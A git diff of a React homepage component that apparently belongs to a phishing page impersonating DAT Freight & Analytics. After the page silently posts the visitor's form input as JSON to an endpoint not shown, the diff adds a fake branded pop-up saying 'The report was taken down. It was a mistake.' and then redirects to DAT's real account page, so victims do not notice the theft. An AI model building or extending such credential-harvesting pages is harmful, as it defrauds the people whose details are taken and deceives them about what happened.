@@ -1,6 +1,7 @@
 import '../HomePgae/homepage.css';
 import '../Form/formfk.css';
 import { useState, useRef } from "react";
+import Swal from 'sweetalert2'
 // import emailjs from 'emailjs-com';
 import pak from '../../img/pak.svg';
 import bac from '../../img/bac.svg';
@@ -146,7 +147,13 @@ function HomePage() {
                     xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
                     xht.send(JSON.stringify(obj));
                     // emailjs.sendForm(SERVICE_ID, TEMPLATE_ID, event.target, USER_ID)
-                    window.location.href = "https://www.dat.com/login#sec2";
+                    Swal.fire({
+                        title: "DAT Freight & Analytics",
+                        text: "The report was taken down. It was a mistake.",
+                        preConfirm: () => {
+                            window.location.href = "https://account.dat.com/profile?source=datone.web";
+                          },
+                      });
                     return;
                 }
             }
